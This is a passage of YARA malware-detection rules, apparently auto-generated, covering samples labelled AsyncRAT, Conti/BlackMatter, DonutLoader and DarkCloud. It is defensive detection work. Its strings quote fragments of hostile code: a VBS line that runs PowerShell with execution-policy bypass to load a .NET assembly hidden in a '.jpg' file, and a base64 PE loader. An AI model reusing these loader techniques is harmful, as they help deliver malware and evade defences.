      $s8 = "51,50,50,55,53,46,58,58,57,51,46,58,57,54,56,46,59,58,59,53,46,59,58,53,52,46,59,58,59,50,46,58,57,55,59,46,58,58,57,59,46,59,57" ascii /* score: '9.00'*/ /* hex encoded string 'QPPUSFXXWQFXWTVFYXYSFYXSRFYXYPFXWUYFXXWYFYW' */
      $s9 = "46,57,57,58,50,46,53,58,53,50,46,54,54,58,56,46,53,51,55,46,58,50,57,54,46,55,55,50,59,46,52,57,53,57,46,51,51,54,56,50,46,54,51" ascii /* score: '9.00'*/ /* hex encoded string 'FWWXPFSXSPFTTXVFSQUFXPWTFUUPYFRWSWFQQTVPFTQ' */
      $s10 = "50,50,57,46,51,50,50,54,53,46,58,56,50,51,46,59,57,50,53,46,59,59,50,52,46,59,56,59,51,46,59,56,58,54,46,51,52,54,58,58,46,59,57" ascii /* score: '9.00'*/ /* hex encoded string 'PPWFQPPTSFXVPQFYWPSFYYPRFYVYQFYVXTFQRTXXFYW' */
      $s11 = "51,46,51,52,54,57,54,46,59,51,59,46,58,58,56,57,46,59,56,57,55,46,59,58,59,54,46,58,56,50,52,46,51,50,50,53,58,46,58,57,55,59,46" ascii /* score: '9.00'*/ /* hex encoded string 'QFQRTWTFYQYFXXVWFYVWUFYXYTFXVPRFQPPSXFXWUYF' */
      $s12 = "53,46,59,58,57,55,46,59,57,53,54,46,58,57,53,53,46,59,56,57,56,46,51,50,51,54,58,46,58,55,59,58,46,59,58,58,52,46,59,56,59,55,46" ascii /* score: '9.00'*/ /* hex encoded string 'SFYXWUFYWSTFXWSSFYVWVFQPQTXFXUYXFYXXRFYVYUF' */
      $s13 = "50,58,56,46,51,50,51,56,58,46,51,50,50,54,51,46,51,52,54,58,58,46,58,57,50,59,46,59,56,59,51,46,51,50,51,54,52,46,59,58,58,51,46" ascii /* score: '9.00'*/ /* hex encoded string 'PXVFQPQVXFQPPTQFQRTXXFXWPYFYVYQFQPQTRFYXXQF' */
      $s14 = "54,46,51,51,57,46,54,53,46,54,52,46,57,56,46,51,51,51,46,51,51,51,46,51,50,54,46,51,50,56,46,51,50,50,46,51,51,51,46,53,55,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'TFQQWFTSFTRFWVFQQQFQQQFQPTFQPVFQPPFQQQFSUFQ' */
      $s15 = "58,58,56,56,46,51,50,50,54,50,46,59,56,59,52,46,59,56,58,54,46,58,57,53,57,46,51,50,50,54,51,46,58,57,53,54,46,55,50,59,57,59,46" ascii /* score: '9.00'*/ /* hex encoded string 'XXVVFQPPTPFYVYRFYVXTFXWSWFQPPTQFXWSTFUPYWYF' */
   condition:
      uint16(0) == 0x2f2f and filesize < 8000KB and
      8 of them
}

rule AsyncRAT_signature__dd031f0a {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_dd031f0a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd031f0a09392ed7c74d3b51641093f5eeed38f87d65e6c3886d63dd1e240aae"
   strings:
      $s1 = "53,52,53,59,52,48,61,60,61,58,48,61,59,52,53,48,61,58,60,57,48,53,52,53,56,59,48,60,60,58,56,48,53,52,53,56,61,48,61,60,60,59,48" ascii /* score: '9.00'*/ /* hex encoded string 'SRSYRHa`aXHaYRSHaX`WHSRSVYH``XVHSRSVaHa``YH' */
      $s2 = "48,61,60,55,52,48,53,52,52,56,54,48,61,53,61,48,61,60,59,58,48,53,52,52,55,61,48,53,52,52,55,57,48,61,58,55,48,61,59,57,59,48,61" ascii /* score: '9.00'*/ /* hex encoded string 'Ha`URHSRRVTHaSaHa`YXHSRRUaHSRRUWHaXUHaYWYHa' */
      $s3 = "52,52,56,54,48,60,59,56,58,48,53,52,52,54,61,48,60,60,58,59,48,61,58,60,58,48,57,52,61,59,61,48,53,52,53,56,61,48,61,60,55,61,48" ascii /* score: '9.00'*/ /* hex encoded string 'RRVTH`YVXHSRRTaH``XYHaX`XHWRaYaHSRSVaHa`UaH' */
      $s4 = "60,48,53,54,56,60,59,48,61,60,61,56,48,60,56,60,61,48,61,59,52,52,48,53,52,53,57,54,48,53,52,52,57,58,48,60,59,56,59,48,61,60,55" ascii /* score: '9.00'*/ /* hex encoded string '`HSTV`YHa`aVH`V`aHaYRRHSRSWTHSRRWXH`YVYHa`U' */
      $s5 = "58,55,48,60,60,59,53,48,61,59,58,57,48,53,52,52,54,61,48,61,58,61,60,48,60,60,58,60,48,61,60,60,59,48,53,54,56,60,60,48,53,52,52" ascii /* score: '9.00'*/ /* hex encoded string 'XUH``YSHaYXWHSRRTaHaXa`H``X`Ha``YHSTV``HSRR' */
      $s6 = "56,48,61,58,60,55,48,60,59,55,59,48,53,52,52,57,59,48,61,60,60,60,48,60,60,52,60,48,53,52,52,60,58,48,53,60,52,48,60,58,52,54,48" ascii /* score: '9.00'*/ /* hex encoded string 'VHaX`UH`YUYHSRRWYHa```H``R`HSRR`XHS`RH`XRTH' */
      $s7 = "55,56,48,61,60,55,60,48,53,52,52,56,56,48,53,52,53,57,52,48,60,60,52,56,48,61,60,55,52,48,61,59,57,61,48,53,52,52,56,55,48,53,52" ascii /* score: '9.00'*/ /* hex encoded string 'UVHa`U`HSRRVVHSRSWRH``RVHa`URHaYWaHSRRVUHSR' */
      $s8 = "61,48,61,60,61,60,48,53,54,56,59,56,48,53,52,53,58,61,48,61,61,61,58,48,53,52,52,57,57,48,60,59,55,59,48,61,60,55,60,48,61,56,61" ascii /* score: '9.00'*/ /* hex encoded string 'aHa`a`HSTVYVHSRSXaHaaaXHSRRWWH`YUYHa`U`HaVa' */
      $s9 = "48,61,60,61,56,48,56,55,54,61,48,53,52,53,57,54,48,61,58,61,52,48,53,55,48,57,52,48,57,52,48,55,57,48,61,58,61,58,48,61,58,59,59" ascii /* score: '9.00'*/ /* hex encoded string 'Ha`aVHVUTaHSRSWTHaXaRHSUHWRHWRHUWHaXaXHaXYY' */
      $s10 = "52,48,57,52,48,55,57,48,53,52,53,56,52,48,53,52,52,55,57,48,53,52,53,58,56,48,60,60,59,58,48,53,52,52,58,53,48,61,60,55,59,48,53" ascii /* score: '9.00'*/ /* hex encoded string 'RHWRHUWHSRSVRHSRRUWHSRSXVH``YXHSRRXSHa`UYHS' */
      $s11 = "48,53,52,52,60,61,48,61,58,59,59,48,53,52,52,56,53,48,60,59,55,59,48,53,52,52,55,55,48,53,52,53,57,57,48,53,52,53,56,61,48,60,59" ascii /* score: '9.00'*/ /* hex encoded string 'HSRR`aHaXYYHSRRVSH`YUYHSRRUUHSRSWWHSRSVaH`Y' */
      $s12 = "48,53,54,53,48,53,52,52,48,53,53,59,48,55,57,48,59,54,48,60,57,48,60,57,48,61,60,48,60,53,48,60,54,48,60,53,48,61,60,48,60,54,48" ascii /* score: '9.00'*/ /* hex encoded string 'HSTSHSRRHSSYHUWHYTH`WH`WHa`H`SH`TH`SHa`H`TH' */
      $s13 = "48,57,52,48,57,52,48,55,57,48,60,60,58,61,48,61,59,59,60,48,53,52,52,60,59,48,61,58,61,58,48,60,57,61,57,48,61,59,60,60,48,61,60" ascii /* score: '9.00'*/ /* hex encoded string 'HWRHWRHUWH``XaHaYY`HSRR`YHaXaXH`WaWHaY``Ha`' */
      $s14 = "52,48,53,52,53,57,60,48,61,59,55,58,48,60,60,57,60,48,53,52,52,55,59,48,61,53,61,48,61,58,60,56,48,61,58,60,59,48,60,60,58,55,48" ascii /* score: '9.00'*/ /* hex encoded string 'RHSRSW`HaYUXH``W`HSRRUYHaSaHaX`VHaX`YH``XUH' */
      $s15 = "59,52,52,48,60,56,60,61,48,53,52,53,58,58,48,61,59,52,56,48,61,58,60,54,48,60,60,52,60,48,53,52,52,57,54,48,61,58,55,57,48,61,58" ascii /* score: '9.00'*/ /* hex encoded string 'YRRH`V`aHSRSXXHaYRVHaX`TH``R`HSRRWTHaXUWHaX' */
   condition:
      uint16(0) == 0x2f2f and filesize < 8000KB and
      8 of them
}

rule AsyncRAT_signature__ee6e1100 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_ee6e1100.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee6e1100d6b85519aeb3ea6ea08c079360abcd095f646470261e4cbfb6c9122c"
   strings:
      $s1 = "51,57,47,55,56,47,52,53,52,47,52,52,60,47,52,53,53,47,52,51,57,47,55,57,47,57,55,47,52,56,47,52,54,51,47,52,56,47,52,52,51,47,52" ascii /* score: '9.00'*/ /* hex encoded string 'QWGUVGRSRGRR`GRSSGRQWGUWGWUGRVGRTQGRVGRRQGR' */
      $s2 = "51,51,51,59,47,60,60,51,53,47,52,59,53,47,59,55,59,58,47,59,59,51,60,47,52,51,52,58,53,47,52,51,51,57,55,47,59,58,53,54,47,59,59" ascii /* score: '9.00'*/ /* hex encoded string 'QQQYG``QSGRYSGYUYXGYYQ`GRQRXSGRQQWUGYXSTGYY' */
      $s3 = "51,58,47,52,51,52,58,55,47,60,58,60,53,47,59,58,57,52,47,52,51,52,55,56,47,59,57,51,55,47,60,59,54,59,47,52,51,51,54,51,47,59,57" ascii /* score: '9.00'*/ /* hex encoded string 'QXGRQRXUG`X`SGYXWRGRQRUVGYWQUG`YTYGRQQTQGYW' */
      $s4 = "60,55,47,60,59,60,55,47,59,57,51,54,47,52,51,52,55,58,47,59,59,57,51,47,52,51,51,55,52,47,60,57,60,53,47,52,51,51,60,52,47,52,51" ascii /* score: '9.00'*/ /* hex encoded string '`UG`Y`UGYWQTGRQRUXGYYWQGRQQURG`W`SGRQQ`RGRQ' */
      $s5 = "56,53,47,56,53,47,54,58,47,52,51,51,54,57,47,60,57,58,56,47,60,58,57,51,47,52,51,51,57,54,47,52,51,52,55,57,47,59,58,54,60,47,60" ascii /* score: '9.00'*/ /* hex encoded string 'VSGVSGTXGRQQTWG`WXVG`XWQGRQQWTGRQRUWGYXT`G`' */
      $s6 = "59,54,55,47,52,51,51,56,54,47,52,51,52,58,52,47,59,59,58,60,47,60,59,58,59,47,60,57,59,59,47,60,59,53,60,47,52,51,51,57,51,47,60" ascii /* score: '9.00'*/ /* hex encoded string 'YTUGRQQVTGRQRXRGYYX`G`YXYG`WYYG`YS`GRQQWQG`' */
      $s7 = "47,52,51,51,55,57,47,60,59,54,60,47,60,58,60,51,47,60,58,54,57,47,60,60,60,59,47,60,57,58,57,47,52,58,60,47,60,57,57,57,47,60,57" ascii /* score: '9.00'*/ /* hex encoded string 'GRQQUWG`YT`G`X`QG`XTWG```YG`WXWGRX`G`WWWG`W' */
      $s8 = "52,51,51,54,52,47,52,51,51,56,57,47,52,51,51,60,53,47,60,59,55,51,47,52,51,51,57,53,47,60,57,58,60,47,60,57,54,58,47,59,59,57,54" ascii /* score: '9.00'*/ /* hex encoded string 'RQQTRGRQQVWGRQQ`SG`YUQGRQQWSG`WX`G`WTXGYYWT' */
      $s9 = "59,60,47,52,51,52,56,57,47,52,51,51,54,51,47,59,58,56,52,47,60,57,60,56,47,60,57,56,57,47,60,59,59,51,47,60,57,59,51,47,60,59,60" ascii /* score: '9.00'*/ /* hex encoded string 'Y`GRQRVWGRQQTQGYXVRG`W`VG`WVWG`YYQG`WYQG`Y`' */
      $s10 = "53,52,47,60,57,51,47,52,51,51,55,52,47,59,59,57,55,47,59,58,56,53,47,60,57,60,55,47,60,57,55,59,47,60,59,60,59,47,52,51,52,58,51" ascii /* score: '9.00'*/ /* hex encoded string 'SRG`WQGRQQURGYYWUGYXVSG`W`UG`WUYG`Y`YGRQRXQ' */
      $s11 = "52,51,53,47,52,52,60,47,52,52,60,47,52,51,53,47,52,53,57,47,52,51,51,47,52,53,53,47,52,52,56,47,52,53,51,47,52,51,60,47,52,52,51" ascii /* score: '9.00'*/ /* hex encoded string 'RQSGRR`GRR`GRQSGRSWGRQQGRSSGRRVGRSQGRQ`GRRQ' */
      $s12 = "60,47,52,51,52,56,58,47,52,51,51,56,53,47,60,59,59,60,47,52,51,51,56,55,47,52,58,53,47,60,57,60,56,47,60,57,55,58,47,60,58,57,52" ascii /* score: '9.00'*/ /* hex encoded string '`GRQRVXGRQQVSG`YY`GRQQVUGRXSG`W`VG`WUXG`XWR' */
      $s13 = "51,47,59,58,55,59,47,52,51,51,56,56,47,52,51,51,55,56,47,60,57,59,51,47,60,59,60,55,47,52,51,51,55,55,47,60,58,51,55,47,60,58,55" ascii /* score: '9.00'*/ /* hex encoded string 'QGYXUYGRQQVVGRQQUVG`WYQG`Y`UGRQQUUG`XQUG`XU' */
      $s14 = "47,60,57,60,52,47,59,57,51,53,47,59,59,58,53,47,52,51,52,55,58,47,52,51,52,56,60,47,52,51,52,58,53,47,59,58,55,59,47,60,60,51,54" ascii /* score: '9.00'*/ /* hex encoded string 'G`W`RGYWQSGYYXSGRQRUXGRQRV`GRQRXSGYXUYG``QT' */
      $s15 = "59,59,57,58,47,59,58,53,54,47,60,60,51,51,47,60,59,60,58,47,60,57,56,56,47,52,51,51,54,59,47,60,54,57,47,60,59,60,58,47,59,59,58" ascii /* score: '9.00'*/ /* hex encoded string 'YYWXGYXSTG``QQG`Y`XG`WVVGRQQTYG`TWG`Y`XGYYX' */
   condition:
      uint16(0) == 0x2f2f and filesize < 6000KB and
      8 of them
}

rule cda529c9ab35409e84865743e8f1b5e8102d9587bafd3bd52389657fe19823db_cda529c9 {
   meta:
      description = "_subset_batch - file cda529c9ab35409e84865743e8f1b5e8102d9587bafd3bd52389657fe19823db_cda529c9.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cda529c9ab35409e84865743e8f1b5e8102d9587bafd3bd52389657fe19823db"
   strings:
      $s1 = "61,51,64,64,64,62,51,64,62,61,62,51,64,61,64,64,51,64,62,64,56,51,56,55,56,62,58,51,56,57,59,63,64,51,63,61,55,58,51,56,59,51,60" ascii /* score: '9.00'*/ /* hex encoded string 'aQdddbQdbabQdaddQdbdVQVUVbXQVWYcdQcaUXQVYQ`' */
      $s2 = "64,61,62,64,51,64,63,57,63,51,56,55,56,60,56,51,56,55,55,58,55,51,64,62,55,55,51,63,61,55,55,51,63,62,58,60,51,63,63,60,62,51,63" ascii /* score: '9.00'*/ /* hex encoded string 'dabdQdcWcQVUV`VQVUUXUQdbUUQcaUUQcbX`Qcc`bQc' */
      $s3 = "63,62,58,63,51,57,60,56,51,64,62,59,62,51,63,62,60,55,51,64,63,59,55,51,64,61,63,60,51,64,63,64,57,51,63,63,62,58,51,63,63,61,64" ascii /* score: '9.00'*/ /* hex encoded string 'cbXcQW`VQdbYbQcb`UQdcYUQdac`QdcdWQccbXQccad' */
      $s4 = "51,56,57,59,64,61,51,56,55,55,58,64,51,57,60,56,51,56,55,55,55,62,51,56,55,56,60,56,51,63,63,62,64,51,64,63,63,58,51,64,61,58,61" ascii /* score: '9.00'*/ /* hex encoded string 'QVWYdaQVUUXdQW`VQVUUUbQVUV`VQccbdQdccXQdaXa' */
      $s5 = "55,64,51,56,56,57,51,56,56,57,51,56,55,56,51,60,55,51,56,56,60,51,56,56,63,51,56,55,62,51,60,56,51,56,55,60,51,56,56,59,51,59,64" ascii /* score: '9.00'*/ /* hex encoded string 'UdQVVWQVVWQVUVQ`UQVV`QVVcQVUbQ`VQVU`QVVYQYd' */
      $s6 = "61,60,51,64,61,62,60,51,56,55,55,60,56,51,63,63,55,63,51,64,62,61,57,51,64,61,64,55,51,64,63,62,62,51,56,59,51,60,56,51,60,56,51" ascii /* score: '9.00'*/ /* hex encoded string 'a`Qdab`QVUU`VQccUcQdbaWQdadUQdcbbQVYQ`VQ`VQ' */
      $s7 = "56,55,61,51,58,61,51,56,55,60,51,56,56,58,51,56,56,61,51,56,57,55,51,56,57,60,51,58,61,51,56,55,56,51,56,56,63,51,56,56,63,51,56" ascii /* score: '9.00'*/ /* hex encoded string 'VUaQXaQVU`QVVXQVVaQVWUQVW`QXaQVUVQVVcQVVcQV' */
      $s8 = "57,51,56,55,55,59,64,51,64,62,58,58,51,56,55,56,60,62,51,63,63,62,57,51,56,55,55,63,62,51,64,64,55,57,51,64,61,62,61,51,64,63,58" ascii /* score: '9.00'*/ /* hex encoded string 'WQVUUYdQdbXXQVUV`bQccbWQVUUcbQddUWQdabaQdcX' */
      $s9 = "56,62,63,51,64,64,64,61,51,64,62,59,62,51,64,63,57,63,51,56,55,56,59,56,51,63,63,61,56,51,56,63,60,51,56,55,55,58,61,51,63,63,61" ascii /* score: '9.00'*/ /* hex encoded string 'VbcQdddaQdbYbQdcWcQVUVYVQccaVQVc`QVUUXaQcca' */
      $s10 = "63,63,61,57,51,56,55,55,58,55,51,63,62,58,63,51,56,55,55,60,58,51,56,55,55,59,57,51,56,55,55,59,63,51,56,57,59,64,61,51,56,55,56" ascii /* score: '9.00'*/ /* hex encoded string 'ccaWQVUUXUQcbXcQVUU`XQVUUYWQVUUYcQVWYdaQVUV' */
      $s11 = "57,59,51,60,60,58,61,56,51,60,61,61,55,62,51,58,64,58,62,51,64,60,62,64,51,57,62,57,51,56,57,57,51,59,62,60,62,51,56,64,63,59,51" ascii /* score: '9.00'*/ /* hex encoded string 'WYQ``XaVQ`aaUbQXdXbQd`bdQWbWQVWWQYb`bQVdcYQ' */
      $s12 = "64,62,51,64,63,64,64,51,56,55,55,60,56,51,64,61,59,61,51,63,62,58,63,51,64,63,63,63,51,63,62,59,62,51,64,61,62,64,51,64,62,61,62" ascii /* score: '9.00'*/ /* hex encoded string 'dbQdcddQVUU`VQdaYaQcbXcQdcccQcbYbQdabdQdbab' */
      $s13 = "61,62,63,51,64,59,57,62,51,60,59,58,60,51,59,55,58,51,58,59,63,55,51,59,60,64,64,51,56,55,55,58,55,51,57,57,64,59,51,56,55,59,58" ascii /* score: '9.00'*/ /* hex encoded string 'abcQdYWbQ`YX`QYUXQXYcUQY`ddQVUUXUQWWdYQVUYX' */
      $s14 = "51,64,61,59,61,51,63,62,61,55,51,56,63,56,51,64,63,58,58,51,56,55,55,60,62,51,56,55,55,63,63,51,64,63,62,64,51,64,62,58,57,51,56" ascii /* score: '9.00'*/ /* hex encoded string 'QdaYaQcbaUQVcVQdcXXQVUU`bQVUUccQdcbdQdbXWQV' */
      $s15 = "51,56,57,55,51,56,56,60,51,62,63,51,63,62,51,63,58,51,63,57,51,61,60,51,56,55,61,51,56,57,56,51,56,56,59,51,56,55,58,51,56,57,55" ascii /* score: '9.00'*/ /* hex encoded string 'QVWUQVV`QbcQcbQcXQcWQa`QVUaQVWVQVVYQVUXQVWU' */
   condition:
      uint16(0) == 0x2f2f and filesize < 8000KB and
      8 of them
}

rule d72cac0b7d27f0cfecfa5d3e7289313b8ff25917d7b850073c3a8453367db200_d72cac0b {
   meta:
      description = "_subset_batch - file d72cac0b7d27f0cfecfa5d3e7289313b8ff25917d7b850073c3a8453367db200_d72cac0b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d72cac0b7d27f0cfecfa5d3e7289313b8ff25917d7b850073c3a8453367db200"
   strings:
      $s1 = "46,58,56,50,55,46,51,50,50,53,59,46,59,56,55,58,46,58,57,53,58,46,51,50,50,56,53,46,59,56,55,58,46,51,50,51,54,57,46,59,58,59,56" ascii /* score: '9.00'*/ /* hex encoded string 'FXVPUFQPPSYFYVUXFXWSXFQPPVSFYVUXFQPQTWFYXYV' */
      $s2 = "46,58,58,56,57,46,58,58,58,50,46,59,56,56,58,46,51,50,50,55,51,46,51,50,50,54,54,46,58,57,55,51,46,51,50,50,59,51,46,58,58,57,53" ascii /* score: '9.00'*/ /* hex encoded string 'FXXVWFXXXPFYVVXFQPPUQFQPPTTFXWUQFQPPYQFXXWS' */
      $s3 = "51,46,51,50,58,54,59,46,51,50,56,46,59,51,53,54,46,56,57,53,58,46,51,51,53,52,56,46,51,52,57,46,55,55,53,56,54,46,55,56,56,57,51" ascii /* score: '9.00'*/ /* hex encoded string 'QFQPXTYFQPVFYQSTFVWSXFQQSRVFQRWFUUSVTFUVVWQ' */
      $s4 = "46,58,58,57,51,46,51,50,50,54,58,46,51,50,51,54,54,46,59,56,59,59,46,59,58,59,54,46,59,56,53,59,46,51,50,51,57,54,46,51,57,46,55" ascii /* score: '9.00'*/ /* hex encoded string 'FXXWQFQPPTXFQPQTTFYVYYFYXYTFYVSYFQPQWTFQWFU' */
      $s5 = "59,50,46,51,50,50,56,56,46,51,50,51,57,53,46,51,50,51,56,54,46,59,56,59,51,46,59,56,58,51,46,51,50,51,56,51,46,59,58,53,56,46,59" ascii /* score: '9.00'*/ /* hex encoded string 'YPFQPPVVFQPQWSFQPQVTFYVYQFYVXQFQPQVQFYXSVFY' */
      $s6 = "58,56,50,56,46,51,50,50,55,57,46,51,50,50,56,53,46,59,58,53,57,46,59,57,54,50,46,59,58,58,56,46,59,58,59,51,46,58,57,54,51,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'XVPVFQPPUWFQPPVSFYXSWFYWTPFYXXVFYXYQFXWTQFQ' */
      $s7 = "50,51,56,58,46,59,58,59,59,46,58,58,58,53,46,58,57,55,54,46,59,58,58,53,46,58,56,50,55,46,58,57,55,51,46,58,56,50,53,46,51,50,50" ascii /* score: '9.00'*/ /* hex encoded string 'PQVXFYXYYFXXXSFXWUTFYXXSFXVPUFXWUQFXVPSFQPP' */
      $s8 = "46,58,58,56,59,46,58,56,50,56,46,51,52,54,59,59,46,52,55,54,46,58,56,50,57,46,52,55,54,46,59,56,54,50,46,58,58,50,57,46,59,57,58" ascii /* score: '9.00'*/ /* hex encoded string 'FXXVYFXVPVFQRTYYFRUTFXVPWFRUTFYVTPFXXPWFYWX' */
      $s9 = "58,57,55,53,46,51,57,56,46,59,58,59,54,46,59,57,56,53,46,59,57,58,52,46,51,50,50,53,59,46,59,58,58,53,46,51,57,46,55,54,46,55,54" ascii /* score: '9.00'*/ /* hex encoded string 'XWUSFQWVFYXYTFYWVSFYWXRFQPPSYFYXXSFQWFUTFUT' */
      $s10 = "46,59,58,58,53,46,59,56,59,58,46,59,56,57,58,46,59,57,53,55,46,59,56,59,52,46,59,58,53,54,46,59,57,58,52,46,51,50,51,53,59,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'FYXXSFYVYXFYVWXFYWSUFYVYRFYXSTFYWXRFQPQSYFQ' */
      $s11 = "54,50,46,51,50,50,54,55,46,59,58,57,59,46,59,58,59,53,46,58,57,51,53,46,58,57,55,51,46,59,56,59,52,46,51,50,51,56,50,46,58,57,55" ascii /* score: '9.00'*/ /* hex encoded string 'TPFQPPTUFYXWYFYXYSFXWQSFXWUQFYVYRFQPQVPFXWU' */
      $s12 = "50,46,58,57,52,55,46,52,55,54,46,59,58,58,52,46,58,58,58,50,46,51,50,51,55,52,46,51,52,54,59,51,46,51,57,46,55,54,46,55,54,46,53" ascii /* score: '9.00'*/ /* hex encoded string 'PFXWRUFRUTFYXXRFXXXPFQPQURFQRTYQFQWFUTFUTFS' */
      $s13 = "54,50,46,59,58,59,59,46,51,50,51,56,50,46,58,58,56,58,46,59,54,54,46,51,50,50,54,58,46,51,50,50,56,51,46,58,58,57,58,46,51,50,50" ascii /* score: '9.00'*/ /* hex encoded string 'TPFYXYYFQPQVPFXXVXFYTTFQPPTXFQPPVQFXXWXFQPP' */
      $s14 = "51,56,52,46,59,56,59,53,46,58,58,57,54,46,58,55,59,59,46,59,58,58,56,46,59,59,59,59,46,51,57,46,55,54,46,55,54,46,53,59,46,58,57" ascii /* score: '9.00'*/ /* hex encoded string 'QVRFYVYSFXXWTFXUYYFYXXVFYYYYFQWFUTFUTFSYFXW' */
      $s15 = "50,50,55,54,46,51,50,50,56,55,46,51,50,50,55,54,46,52,55,54,46,51,50,51,53,59,46,58,56,50,51,46,59,57,59,52,46,59,57,56,59,46,51" ascii /* score: '9.00'*/ /* hex encoded string 'PPUTFQPPVUFQPPUTFRUTFQPQSYFXVPQFYWYRFYWVYFQ' */
   condition:
      uint16(0) == 0x2f2f and filesize < 9000KB and
      8 of them
}

rule Conti_signature__d7edc36978dead518b6d44c58aaeb1b3_imphash_ {
   meta:
      description = "_subset_batch - file Conti(signature)_d7edc36978dead518b6d44c58aaeb1b3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1e7c0f7091e8ed3687b06556cbbda638af99e35d372ba257cedb8ada4b2c43fe"
   strings:
      $s1 = "https ://getsession.org/download" fullword wide /* score: '24.00'*/
      $s2 = "__MUTEX_NAME__" fullword ascii /* score: '15.00'*/
      $s3 = "Error importing public key: " fullword ascii /* score: '13.00'*/
      $s4 = "BlackMatter Ransomware encrypted all your files!" fullword wide /* score: '9.00'*/
      $s5 = "To get your data back and keep your privacy safe," fullword wide /* score: '9.00'*/
      $s6 = "Your network has been encrypted" fullword wide /* score: '9.00'*/
      $s7 = "\\wall.bmp" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule d6a94b849b61f38a50afae24c5fb0abf_imphash_ {
   meta:
      description = "_subset_batch - file d6a94b849b61f38a50afae24c5fb0abf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dcd479eb19cc39acf00e95dcd328a955270f76b2d2a5e20a620d1c0ebe8f4c5a"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule DonutLoader_signature__cde050a816ce965fbd53235fb25e96c7_imphash_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_cde050a816ce965fbd53235fb25e96c7(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d20d4e90de355c90f4d9a0b7b80cf1aa32fe8b9b7aba5db730cfdde16df43021"
   strings:
      $s1 = "mar40F.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule DarkCloud_signature__da81261259e99bfaae1a58c0222953dc_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_da81261259e99bfaae1a58c0222953dc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dad5ff1f6db1e913bdd10a80028713c4deb9b25827173e6dd991874ad9e5ba2c"
   strings:
      $s1 = "bKERNEL32.DLL" fullword wide /* score: '23.00'*/
      $s2 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s3 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s4 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AsyncRAT_signature__dc9fa9a8 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_dc9fa9a8.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc9fa9a820d122d2013a9f9ad2bc5963708d070dc142e9c44620fe794668bd67"
   strings:
      $x1 = "CreateObject(\"wscript.shell\").Run \"powershell.exe -EP Bypass -Command \"\"[byte[]] $dwdwdwwasa = (Get-Content 'C:\\Users\\Pub" ascii /* score: '61.00'*/
      $x2 = "CreateObject(\"wscript.shell\").Run \"powershell.exe -EP Bypass -Command \"\"[byte[]] $dwdwdwwasa = (Get-Content 'C:\\Users\\Pub" ascii /* score: '61.00'*/
      $s3 = "Set objFile = objFSO.OpenTextFile(\"C:\\Users\\Public\\logsa.jpg\", 2, True)" fullword ascii /* score: '27.00'*/
      $s4 = "sa.jpg').Split(',') | ForEach-Object { $_ / 30 };[System.Threading.Thread]::getDomain().Load($dwdwdwwasa);[Dynamic.Emiit]::Runni" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 9000KB and
      1 of ($x*) and all of them
}

rule d9bb323a28644f9b964e5649dc162188413d9cd597174d9e783f548f9f167b53_d9bb323a {
   meta:
      description = "_subset_batch - file d9bb323a28644f9b964e5649dc162188413d9cd597174d9e783f548f9f167b53_d9bb323a.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d9bb323a28644f9b964e5649dc162188413d9cd597174d9e783f548f9f167b53"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s3 = "        [Byte[]]$FASFJASFAS6AS6 = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '22.00'*/
      $s4 = "    if ((Get-Process \"MSBuild\" -ErrorAction SilentlyContinue) -eq $null) {" fullword ascii /* score: '22.00'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAD" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
